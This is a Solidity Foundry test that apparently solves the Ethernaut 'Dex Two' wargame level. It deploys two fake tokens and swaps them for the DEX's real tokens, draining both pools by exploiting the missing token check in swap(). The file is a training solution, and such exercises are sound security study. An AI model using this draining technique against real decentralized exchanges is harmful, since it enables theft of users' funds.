// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract FakeToken {
    string public name = "Fake Token";
    string public symbol = "FTK";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {

        uint256 initialSupply = 10000 ether;
        balanceOf[msg.sender] = initialSupply;
        totalSupply = initialSupply;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautDexTwoTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0xf59112032D54862E199626F55cFad4F8a3b0Fce9; 

    function testLevel23_DexTwo() public {
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        console.log("Dex Two Address:", levelAddr);

        IDexTwo dex = IDexTwo(levelAddr);
        address t1 = dex.token1();
        address t2 = dex.token2();

        FakeToken fake1 = new FakeToken();
        FakeToken fake2 = new FakeToken(); 

        fake1.transfer(levelAddr, 1);
        fake2.transfer(levelAddr, 1);

        fake1.approve(levelAddr, type(uint256).max);
        fake2.approve(levelAddr, type(uint256).max);

        dex.swap(address(fake1), t1, 1);
        
        dex.swap(address(fake2), t2, 1);

        uint256 dexT1Bal = dex.balanceOf(t1, levelAddr);
        uint256 dexT2Bal = dex.balanceOf(t2, levelAddr);
        
        console.log("Sisa T1 di DEX:", dexT1Bal);
        console.log("Sisa T2 di DEX:", dexT2Bal);
        
        assertEq(dexT1Bal, 0);
        assertEq(dexT2Bal, 0);

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}